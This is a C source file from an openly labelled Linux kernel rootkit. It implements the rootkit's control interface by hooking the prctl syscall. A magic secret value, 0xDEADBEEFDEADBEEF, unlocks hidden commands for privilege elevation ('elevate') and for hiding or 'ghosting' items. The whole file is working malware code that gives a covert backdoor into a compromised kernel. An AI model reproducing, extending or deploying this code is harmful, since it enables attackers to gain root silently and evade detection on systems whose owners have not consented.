/*
Copyright (C) 2019 Bailey Defino
<https://bdefino.github.io>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/
#include "iface.h"

/* rootkit interface */

static struct iface_command iface__commands[] = {
  (struct iface_command) {
    .command = "drop",
    .handler = (iface_command_handler_t) &drop
  },
  (struct iface_command) {
    .command = "elevate",
    .handler = (iface_command_handler_t) &elevate
  },
  (struct iface_command) {
    .command = "ghost",
    .handler = (iface_command_handler_t) &ghost
  },
  (struct iface_command) {
    .command = "hide",
    .handler = (iface_command_handler_t) &hide
  },
  (struct iface_command) {
    .command = "show",
    .handler = (iface_command_handler_t) &show
  },
  (struct iface_command) {
    .command = "unghost",
    .handler = (iface_command_handler_t) &unghost
  }
};
static struct sctm_hook iface__hook = {
  .call = __NR_prctl, /* `sys_prctl` (102) */
  /* `.hook` is defined later on */
  /* `.hooked` is zeroed by the compiler */
};
static struct sctm *iface__sctm = NULL;
/* unlikely value for `sys_prctl`'s first argument */
static unsigned long iface__secret = 0xDEADBEEFDEADBEEF;

int iface_exit(void) {
  if (iface__sctm == NULL)
    return -EFAULT;
  
  if (IS_ERR(iface__sctm))
    return -EINVAL;
  return sctm_unhook(iface__sctm, &iface__hook);
}

/*
delegate based on whether the secret is provided,
and return the delegate's absolute return value
*/
unsigned long iface_hook_func(unsigned long secret, char __user *command,
    unsigned long arg0, unsigned long arg1, unsigned long arg2,
    unsigned long arg3) {
  char command_buf[100]; /* easier than `kmalloc`ing */
  iface_command_handler_t handler;
  unsigned int i;
  int retval;
  
  if (!iface__hook.hooked)
    return EINVAL;

  /* need correct secret */

  if (secret != iface__secret)
    /* the original should already return a positive value */

    return (*iface__hook.original)(secret, (unsigned long) command, arg0,
      arg1, arg2, arg3);

  /*
  get the command

  we don't care if this fails, because `strcmp`
  will take care of invalid buffers
  */

  memset(command_buf, '\0', sizeof(command_buf));
  strncpy_from_user(command_buf, command, sizeof(command_buf));

  /* grab the command handler */

  handler = NULL;

  for (i = 0; i < sizeof(iface__commands) / sizeof(iface__commands[0]); i++) {
    if (!strcmp(command_buf, iface__commands[i].command)) {
      handler = iface__commands[i].handler;
      break;
    }
  }

  if (handler != NULL) {
    /*
    the command exists, and has a handler

    return its absolute return value
    */

    retval = (*handler)(arg0, arg1, arg2, arg3);
    return retval < 0 ? -retval : retval;
  }
  return EINVAL;
}

int iface_init(struct sctm *sctm) {
  if (!IS_ERR_OR_NULL(iface__sctm))
    return -EINVAL;
  
  if (sctm == NULL)
    return -EFAULT;
  
  if (IS_ERR(sctm))
    return -EFAULT;
  iface__hook.hook = (sctm_syscall_handler_t) &iface_hook_func;
  iface__sctm = sctm;
  return sctm_hook(iface__sctm, &iface__hook);
}

